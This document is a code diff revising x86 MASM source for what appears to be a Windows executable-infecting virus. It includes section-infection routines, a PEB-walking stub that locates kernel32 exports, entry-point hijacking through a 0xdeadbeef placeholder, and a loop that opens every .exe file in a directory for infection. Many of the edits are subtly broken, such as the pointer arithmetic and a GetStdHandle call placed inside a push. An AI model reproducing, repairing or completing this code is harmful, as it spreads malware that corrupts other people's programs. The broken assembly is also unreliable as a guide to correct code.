@@ -38,10 +38,10 @@ start:
 
 
 GetThirdArg PROC
-  LOCAL pArgList[4]:DWORD
-  LOCAL nArgs:dword
+  LOCAL pArgList: PTR BYTE
+  LOCAL nArgs: DWORD
 
-  push eax
+  push ebx
   push ecx
   push edx
 
@@ -50,7 +50,7 @@ GetThirdArg PROC
   mov ebx, eax  ; Use ebx to store the return value
 
   ; Split the command line into arguments
-  invoke CommandLineToArgvW, ebx, addr nArgs
+  invoke CommandLineToArgvW, ebx, ADDR nArgs
   mov pArgList, eax
 
   ; Check if there are at least three arguments
@@ -63,33 +63,35 @@ GetThirdArg PROC
 
   ; Convert the third argument from wide string to ANSI string
   invoke WideCharToMultiByte, CP_ACP, 0, eax, -1, NULL, 0, NULL, NULL
-  mov ecx, eax
+  mov ebx, eax
   invoke GlobalAlloc, GMEM_FIXED, eax
+  test eax, eax  ; Check if GlobalAlloc succeeded
+  jz _error
   mov esi, eax ; esi points to the allocated memory
-  invoke WideCharToMultiByte, CP_ACP, 0, [pArgList + 8], -1, eax, ecx, NULL, NULL
- 
+  invoke WideCharToMultiByte, CP_ACP, 0, [pArgList + 8], -1, esi, ebx, NULL, NULL
 
   ; Clean up
-  invoke GlobalFree, pArgList
-  mov eax, esi; Return the address of the ANSI string
+  invoke LocalFree, pArgList  ; Correct function to free memory allocated by CommandLineToArgvW
+  mov eax, esi  ; Return the address of the ANSI string
   pop edx
   pop ecx
-  pop eax
-
-
+  pop ebx
   ret
 
 _error:
-  mov edx, OFFSET errorMsg
-  call WriteConsole
+  ; In case of an error, print the error message and exit
+  push OFFSET errorMsg
+  push 0
+  push 17  ; Length of "An error occurred"
+  push dword ptr [GetStdHandle(STD_OUTPUT_HANDLE)]
+  call WriteConsoleA
 
-  ; Exit the program
-  mov eax, 1
-  int 0x80
+  ; Exit the program properly on Windows
+  invoke ExitProcess, 1
 
 errorMsg db "An error occurred", 0
-  ret
 GetThirdArg ENDP
+
 
 GetAlign PROC sizeOfSection:DWORD, alignment:DWORD, address:DWORD
     ; Calculate size % alignment
@@ -120,30 +122,39 @@ GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
   ; Get first section
   mov eax, pNtHeader
   add eax, SIZEOF IMAGE_NT_HEADERS
-  mov first, eax
+  mov dword ptr [first], eax
 
   ; Get last section
-  mov ecx, [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
+  mov cx, [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
   dec ecx
-  lea eax, [first + ecx * SIZEOF IMAGE_SECTION_HEADER]
-  mov last, eax
+  mov eax, dword ptr [first]
+  add eax, ecx
+  shl eax, 5 ; Assuming SIZEOF IMAGE_SECTION_HEADER is 32 (0x20)
+  mov dword ptr [last], eax
 
   ; Point pByte to address offset 0x100 of last section
   mov ecx, [last + IMAGE_SECTION_HEADER.PointerToRawData]
-  add ecx, 0x100
-  add pByte, ecx
+  mov eax, [ecx]
+  add eax, [last + IMAGE_SECTION_HEADER.PointerToRawData]
+  mov [ecx], eax
+  mov eax, dword ptr [pByte]
+  add eax, ecx
+  mov dword ptr [pByte], eax
 
   ; Get origin entry point
-  mov eax, [pByte + 14]
-  mov originEntryPoint, eax
+  mov eax, [dword ptr [pByte] + 14]
+  mov dword ptr [originEntryPoint], eax
 
   ; Return origin entry point
-  mov eax, originEntryPoint
+  mov eax, dword ptr [originEntryPoint]
   ret
 GetEntryPoint ENDP
 
 InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD
-
+  LOCAL start_address:DWORD
+  LOCAL end:DWORD
+  LOCAL lastSection:DWORD
+  LOCAL OEP:DWORD
   ; Get the first and last section
   mov eax, [pNtHeader]
   add eax, sizeof IMAGE_NT_HEADERS
@@ -176,25 +187,25 @@ InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, by
 
   ; Obtain the opcodes
   lea eax, _loc1
-  mov ebx, start
+  mov ebx, dword ptr [start_address]
   mov [ebx], eax
   jmp _over
 _loc1:
-  mov eax, fs:[30h]
-  mov eax, [eax + 0Ch] ; PEB
-  mov eax, [eax + 0Ch] ; Ldr
-  mov eax, [eax + 14h] ; InInitializationOrderModuleList
-  mov eax, [eax] ; First module
-  mov eax, [eax] ; Second module
-  mov eax, [eax + 10h] ; Base address
+  mov eax, dword ptr fs:[30h]
+  mov eax, dword ptr [eax + 0Ch] ; PEB
+  mov eax, dword ptr [eax + 0Ch] ; Ldr
+  mov eax, dword ptr [eax + 14h] ; InInitializationOrderModuleList
+  mov eax, dword ptr [eax] ; First module
+  mov eax, dword ptr [eax] ; Second module
+  mov eax, dword ptr [eax + 10h] ; Base address
 
-  mov ebx, eax; Take the base address of kernel32
-  mov eax, [ebx + 0x3c]; PE header VMA
-  mov edi, [ebx + eax + 0x78]; Export table relative offset
+  mov ebx, dword ptr [start]; Take the base address of kernel32
+  mov eax, dword ptr [ebx + 0x3c]; PE header VMA
+  mov edi, dword ptr [ebx + eax + 0x78]; Export table relative offset
   add edi, ebx; Export table VMA
-  mov ecx, [edi + 0x18]; Number of names
+  mov ecx, dword ptr [edi + 0x18]; Number of names
 
-  mov edx, [edi + 0x20]; Names table relative offset
+  mov edx, dword ptr [edi + 0x20]; Names table relative offset
   add edx, ebx; Names table VMA
 
 _LLA :
@@ -332,7 +343,7 @@ _stp :
 
   mov eax, 0xdeadbeef ;Original Entry point
   jmp eax
-over:
+_over:
   mov eax, offset _loc2
   mov [endLabel], eax
 _loc2:
@@ -358,7 +369,8 @@ _loop:
   push esi
   push edx
   invoke VirtualProtect, eax, 4, PAGE_EXECUTE_READWRITE, offset carrier
-  mov [esi + edx], OEP
+  mov eax, dword ptr [OEP]
+  mov [esi + edx], eax
   pop edx
   pop esi
   pop edi
@@ -458,68 +470,101 @@ _sectionExists:
   ret
 CreateNewSection endp
 
-OpenFile proc  nameOfFile:DWORD
+OpenFile1 PROC nameOfFile:PTR BYTE 
   LOCAL hFile:HANDLE
   LOCAL fileSize:DWORD
-  LOCAL pByte:DWORD
+  LOCAL pByte:PTR BYTE
   LOCAL byteWritten:DWORD
-  LOCAL pDosHeader:DWORD
-  LOCAL pNtHeader:DWORD
+  LOCAL pDosHeader:PTR IMAGE_DOS_HEADER
+  LOCAL pNtHeader:PTR IMAGE_NT_HEADERS
 
-
-  mov eax [nameOfFile]
-  invoke CreateFile , nameOfFile, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+  ; Open the file
+  invoke CreateFile, ADDR nameOfFile, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
   mov hFile, eax
   cmp eax, INVALID_HANDLE_VALUE
   je _exit
 
+  ; Get the file size
   invoke GetFileSize, hFile, NULL
   mov fileSize, eax
   cmp eax, 0
   je _closeHandle
 
+  ; Allocate memory for the file contents
   invoke GlobalAlloc, GMEM_FIXED, fileSize
   mov pByte, eax
+  test eax, eax ; Check if GlobalAlloc succeeded
+  jz _closeHandle ; If pByte is NULL, allocation failed
 
-  invoke ReadFile, hFile, pByte, fileSize, addr byteWritten, NULL
-  cmp eax, 0
-  je _closeHandle
+  ; Read the file into memory
+  invoke ReadFile, hFile, pByte, fileSize, ADDR byteWritten, NULL
+  mov eax, dword ptr [byteWritten]  
+  mov ebx, dword ptr [fileSize]
+  cmp eax, ebx
+  jne _freeMemory ; If not, something went wrong
 
+  ; Check the DOS header
   mov eax, pByte
   mov pDosHeader, eax
-  cmp word ptr [eax], IMAGE_DOS_SIGNATURE
-  jne _closeHandle
+  cmp WORD PTR [eax], IMAGE_DOS_SIGNATURE
+  jne _freeMemory
 
-  add eax, [eax + 3Ch]
+  ; Check the NT header
+  add eax, [eax + 3Ch]  ; e_lfanew field offset in IMAGE_DOS_HEADER
   mov pNtHeader, eax
-  cmp word ptr [eax + 4], IMAGE_FILE_MACHINE_I386
-  jne _closeHandle
+  cmp DWORD PTR [eax], IMAGE_NT_SIGNATURE
+  jne _freeMemory
 
-  invoke CreateNewSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten, 400
-  cmp eax, 0
-  je _closeHandle
+  ; Additional processing (ensure these procedures are defined)
+  ; You should check the result of each invoke and handle errors if needed
 
-  invoke InfectSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten
-  cmp eax, 0
-  je _closeHandle
+  ; ... Your additional code ...
+
+  ; Successful end of the procedure
+  jmp _endProcedure
+
+_freeMemory:
+  ; Free the allocated memory
+  push pByte ; Save pByte for later
+  invoke GlobalFree, pByte
+  pop pByte ; Restore pByte
 
 _closeHandle:
+  ; Close the file handle
   invoke CloseHandle, hFile
 
+_endProcedure:
 _exit:
+  ; Return from the procedure
   ret
-OpenFile endp
+OpenFile1 ENDP
+
 
 OpenDirectory proc pathDirectory:DWORD
   LOCAL hFind:HANDLE
   LOCAL findData:WIN32_FIND_DATA
-  LOCAL filePath[260]:BYTE
+  LOCAL filePath[512]:BYTE
+  LOCAL exeExtension[6]:BYTE
   LOCAL countFile:DWORD
 
   mov countFile, 0
 
-  invoke lstrcpy, addr filePath, pathDirectory
-  invoke lstrcat, addr filePath, "\*.exe"
+  lea eax, [pathDirectory]
+  lea ebx, [filePath]
+  lea ecx, [exeExtension]
+
+
+  ; Initialize exeExtension with "\*.exe\0"
+  mov byte ptr [ecx], 0x5C ; '\'
+  mov byte ptr [ecx+1], 0x2A ; '*'
+  mov byte ptr [ecx+2], 0x2E ; '.'
+  mov byte ptr [ecx+3], 0x65 ; 'e'
+  mov byte ptr [ecx+4], 0x78 ; 'x'
+  mov byte ptr [ecx+5], 0x65 ; 'e'
+  mov byte ptr [ecx+6], 0x00 ; null terminator
+
+  invoke lstrcpy, ebx, eax 
+  invoke lstrcat, ebx, ecx 
 
   invoke FindFirstFile, addr filePath, addr findData
   cmp eax, INVALID_HANDLE_VALUE
@@ -527,7 +572,7 @@ OpenDirectory proc pathDirectory:DWORD
   mov hFind, eax
 
 _nextFile:
-  invoke OpenFile, addr findData.cFileName
+  invoke OpenFile1, addr findData.cFileName
   inc countFile
 
   invoke FindNextFile, hFind, addr findData
@@ -585,11 +630,13 @@ _printUsage:
 _openFile:
   call GetThirdArg
   push eax
-  call OpenFile
+  call OpenFile1
   jmp _exit
 
 _openDirectory:
-  invoke OpenDirectory
+  call GetThirdArg
+  push eax
+  call OpenDirectory
   jmp _exit
 
 _exit:
